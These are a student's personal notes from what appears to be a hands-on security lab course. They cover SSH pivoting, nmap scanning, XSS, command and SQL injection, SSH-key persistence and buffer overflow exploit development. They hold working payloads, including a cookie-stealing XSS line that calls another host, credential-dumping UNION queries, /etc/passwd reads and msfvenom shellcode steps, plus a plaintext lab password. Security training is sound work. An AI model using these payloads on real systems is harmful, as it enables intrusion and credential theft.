# Security
MIDY-003-M
USERINFO::http://10.50.21.3/classinfo.html
CTFd::http://10.50.20.250:8000

xfreerdp /v:10.50.29.185 /u:student +clipboard +dynamic-resolution +glyph-cache

Stack: 1 	
Username: MIDY-003-M 	
Password: 98DjctjRf4TQpHB ---- password
Lin.internet: 10.50.28.189
Lin.Ops: 10.50.25.1
Win.Ops: 10.50.29.185

## SSH
ssh student@10.50.28.189 -D 9050
ssh student@10.50.28.189 -L1111:192.168.28.111:8080
proxychains nmap -Pn -T4 -n -p1-10000 192.168.128.111

## NEW SSH
ssh -MS /tmp/jump student@10.50.28.189 
ssh -S /tmp/jump dummy
ssh -S /tmp/jump -O forward -D 9050 dummy  --- DYNO port 
ssh -S /tmp/jump -O cancel -D 9050 dummy  --- DYNO port 


ssh -S /tmp/jump -O forward -L1111:10.100.28.40:80 DUMB
ssh -S /tmp/jump -O forward -L10100:192.168.28.111:2222 DUMB
ssh -S /tmp/jump -O forward -L10100:192.168.28.111:2222 DUMB
ssh -MS /tmp/T1 student@127.0.0.1 -p10100

1243ASDFasdf!!!!
## NMAP scanning
HOST DISCOVERY: 
    for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
    
 ///NMAP scripts --
    --script http-enum.nse
    --script smb-os-discovery.nse //only with windows
 
PORT ENUMERATION:  
    sudo proxychains nmap -Pn -T4 -sT -p1-10000 10.100.28.40 2>/dev/null

PORT INTERIGATION:  
    proxychains nc 10.100.28.40 80







# Web Expliotation (XSS)
**Requests**
GET
POST
HEAD
PUT

**HTTP Response Codes**
10X == Informational
2XX == Success
30X == Redirection
4XX == Client Error
5XX == Server Error

https://user-agents.net/lookup

Check for Robots.txt

sudo apt install nikto -y

nikto -h 10.100.28.40

**Attack Methods**
//Cookie script  ------did not do -- cookie found in back end

 <script>document.location="http://10.100.28.55/Cookie.php?username=" + document.cookie;</script>


//Directory Traversal(GET) -- myfile=../../../../etc/passwd
//Directory Traversal(POST) -- File to read [../../../../etc/passwd]

//Malicious File Upload
Bad.php -- on lin-ops
goes to /uploads

//Command Injection
;whoami
;cat /etc/passwd
;ls -latr & netstat -rn
|| ifconfig

//SSH Key Upload
ssh -keygen -t rsa -- on lin-ops
cat ~/.ssh/id_rsa.pub  --copy this
                    --on web host
whoami -- find user                    
cat /etc/passwd -- find users home directory                    
ls -la /users/home/directory      --check if .ssh exists
mkdir /users/home/directory/.ssh   --make .ssh in users home folder if it does not exist
echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys  -- puts ssh key in dir
cat /users/home/directory/.ssh/authorized_keys  -- verify



# Web Exploitation(SQL)

FOLLOW THE STEPS
we are using "mysql"
we wont be writeing to a database
may be case sensitive
Schema and Database are interchangable
@@Version gives version number
GET -- URL  ---- if you cant type, it is a get method
POST -- input box

if you see username and password input fields, use sql

DONT FORGET ABOUT THE "ESCAPE STRING"

Database(tables(columns(data)))


[Information_schema]
[mysql]               ----- These are defaults
[performance_schema] 

**Select**
**Union**


SHOW DATABASES;
show tables;
select * from session.car;

select * from session.car UNION select name,type,cost,color from session.car:

------------------------------------------------
###TESTING###
IF LOGIN PAGE TEST SQL BY USING THIS
'or 1='1

GO TO DEVCON, OPEN NETWORK TAB, CLICK REQUEST, POST METHOD, HIT 'RAW' SWITCH, COPY CONTENTS
PUT '?' AFTER THE URL, PASTE RAW CONTENTS

THE ONLY THING YOU CAN GET FROM A LOGIN PAGE IS USERNAMES AND PASSWORDS

------------------------------------------------
###DUMPING THE DATABASE###
**using valid querys to dump the databases**

POST            Audi'or 1='1

GET             OR 1 = 1 ;#

------------------------------------------------
###FINDING THE AMOUNT OF COLUMNS###

Audi' UNION SELECT 1,2,3,4,5;#

------------------------------------------------
###GOLDEN STATEMENT###
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;#

---POST
**WORKING EXAMPLES**
UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns;#
Audi'UNION SELECT id,2,name,pass,5 FROM session.user;#
Audi'UNION SELECT tireid,2,name,size,cost FROM session.Tires;#


---GET
**WORKING EXAMPLES**
?Selection=2 UNION SELECT 1,3,2 FROM information_schema.columns;#
?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
?Selection=2 UNION SELECT username,studentID,passwd FROM session.userinfo;#

?category=1 UNION SELECT username,password,permission FROM sqlinjection.members;#



# REVERSE ENGINEERING ---IDA GHIDRA
MOV                  -----------lea is fancy MOV
move source to destination
PUSH
push source onto stack
POP
Pop top of stack to destination
INC
Increment source by 1
DEC
Decrement source by 1
ADD
Add source to destination
SUB
Subtract source from destination
CMP
Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
JMP
Jump to specified location
JLE
Jump if less than or equal
JE
Jump if equal


### ASSEMBLY 
```
main:
    mov rax, 16
    push rax
    jmp mem2
    
mem1:
    mov rax, 0
    ret
    
mem2:
    pop r8
    cmp rax, r8
    je mem1
```
**MAIN IS ALWAYS A GOOD PLACE TO START**
```
main:
    lea rcx, 25
    lea rbx, 62
    jmp mem1
    
mem1:
    sub rbx, 40
    lea rsi, rbx
    cmp rcx, rsi
    jnz mem2
    jmp mem3

mem2:
    lea rax, 1
    ret

mem3:
    lea rax, 0
    ret
```

**DEMO**

use ghidra
inport file 
auto analyze file 
search string using toolbar 
find the functions it uses to get input 



# EXPLOIT DEV
GDP
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit


run the process
**Interacting with process**
USER INPUT (Enter a number:    )
PARAMETER  (mv {}              )

run <<< $(python lin_buff.py) -------Triple carrots for user input
run $(python lin_buff.py)     -------No carrots for parameters




**IS IT OVERFLOWABLE?**
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

**PEDA IS ONLY ON LINUX-OPSTATION**
pdisass
### PROCESS
https://wiremask.eu/tools/buffer-overflow-pattern-generator/ ------get buffer pattern from site
 
GDB {FILE}

```
overflow = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac    7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9    Ag0Ag1Ag2Ag3Ag4Ag5Ag"

print(overflow)
```
run <<< $(python lin_buff.py) 

**EDIT SCRIPT**
overflow = "A" * 62
eip = "B" * 4
print(overflow + eip)


script must be on local machine, put it in /tmp

-----------------------------------
which gdb
if gdb is installed on the box then do buffer overflow
if it is not installed on the box you arent gunna do buffer overflow

env - gdb func
unset env LINES
unset env COLUMNS              -------THIS PROCESS MUST BE DONE ON THE ADVERSARY
run
info proc map

------------------------------------
get the line directly below heap
get the line directly above stack

                              JMP  ESP
find /b 0xf7de1000,0xf7ffe000,0xff,0xe4

msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python

**TROUBLESHOOTING**
run as sudo
generate new shellcode
change to new eip


scp the executable to the our machine.













